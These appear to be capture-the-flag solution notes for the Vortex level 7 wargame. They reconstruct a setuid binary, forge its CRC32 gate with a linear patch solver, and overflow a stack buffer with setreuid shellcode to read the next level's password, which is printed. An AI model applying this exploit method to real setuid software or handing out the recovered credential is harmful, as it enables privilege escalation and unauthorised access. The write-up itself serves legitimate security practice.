# Vortex L7 — solution notes (solved 2026-11-16)

## The program (live binary, verified 2026-11-16)

`/vortex/vortex7`, mode 4750, setuid vortex8, group vortex7, 14956 bytes,
md5 `c4f614fe053e5e2f3d4c34e0d34fd878`.  No published source — the level
page says "Generic Binary Exploitation: disassemble it".  Reconstructed
from `objdump` (the binary is not stripped):

```c
int main(int argc, char **argv) {
    unsigned crc = crc32(0, argv[1], strlen(argv[1]));
    if (crc == 0xe1ca95ee)
        strcpy(buf, argv[1]);   /* buf = ebp-0x46 */
    else
        printf("0x%08x\n", crc);
}
```

CRC32 is the glibc table-driven implementation (poly 0xedb88320, init 0,
no final XOR), verified by running `/vortex/vortex7 test` -> `0xf93ba110`.

## Measured live

- The CRC gate: every payload must hash to `0xe1ca95ee` before the strcpy
  runs.  CRC32 is linear over GF(2) in the message bits, so a 4-byte
  patch at the payload end can steer the CRC to any target
  (`crcpatch.py`: 32 deltas, one per patch bit, row-reduced to a basis,
  solved for the selection vector — deterministic, no guessing).
- `GNU_STACK` is **RWE** and ASLR is off, so shellcode on the stack runs.
- main's epilogue (the key to the ret placement):

  ```
  lea -0x8(%ebp),%esp; pop %ecx; pop %ebx; pop %ebp;
  lea -0x4(%ecx),%esp; ret
  ```

  The final `ret` pops its target from **ecx-4**, not from just above the
  saved registers.  `ecx` is loaded from payload bytes 62..65, so with
  ecx = buf+78 the ret address is read from bytes 74..77.
- The buffer address shifts with argv length and the session environment:
  0xffffda22 in probe sessions, 0xffffd212 in the recorded one.  It must
  be measured under gdb **in the same session shape** (`break *0x804920e`
  at the crc compare, `p/x $ebp-0x46`, 350-char dummy input).  The
  187-byte NOP sled absorbs any residual drift.
- A ret2libc `system("/bin/sh")` chain spawns a shell that shows only
  `uid=5007` in `id` — the dynamic loader drops the effective uid for the
  non-setuid child — so the shell reads the pass file as vortex7 and is
  refused.  The fix is `setreuid` inside the payload's own shellcode.
- The setuid argument 5008 = 0x1390 is `90 13 00 00` little-endian: NUL
  bytes, which would terminate strcpy.  The value is built with register
  arithmetic instead: `xor ebx,ebx; mov bh,0x13; mov bl,0x90`.

## The exploit

350-byte argv[1] = `'A'*62 + ecx(=buf+78) + 'BBBB'*2 + ret(=buf+160)
+ NOP sled + shellcode + CRC patch`, where the patch makes
`crc32(payload) == 0xe1ca95ee`.  The shellcode (81 bytes, NUL-free):

```asm
xor ebx,ebx; mov bh,0x13; mov bl,0x90   ; ebx = 5008
mov ecx,ebx; mov al,70; int 0x80        ; setreuid(5008, 5008)
; push "/etc/vortex_pass/vortex8", open/read/write to stdout, exit(0)
```

Delivery: `drv.c` freads the payload file into a 4096-byte buffer (the
payload is NUL-free), NUL-terminates it and `execv`s `/vortex/vortex7`
with it as argv[1].  The buffer address is measured with gdb in the same
session, then `ex7.py <buf> pay7.bin` writes the final payload.

## Verification

- `/vortex/vortex7 test` -> `0xf93ba110` (the CRC gate, live).
- `crcpatch.py` self-check: `crc7(full): 0xe1ca95ee target: 0xe1ca95ee`.
- `./drv7 pay7.bin` -> `X2cOOCYnT`, exit 0.
- Login as vortex8 with `X2cOOCYnT` verified (`uid=5008`).

## Password for vortex8

`X2cOOCYnT`

## Files

- `crcpatch.py` — GF(2) linear CRC32 patch solver (also self-checks with
  a `test` payload when run directly).
- `ex7.py` — payload builder: `ex7.py <buf_addr> <out_file>`.
- `drv.c` — raw-bytes argv delivery driver (compiled to `drv7`).
- The recording: `recordings/vortex/L7.cast`.
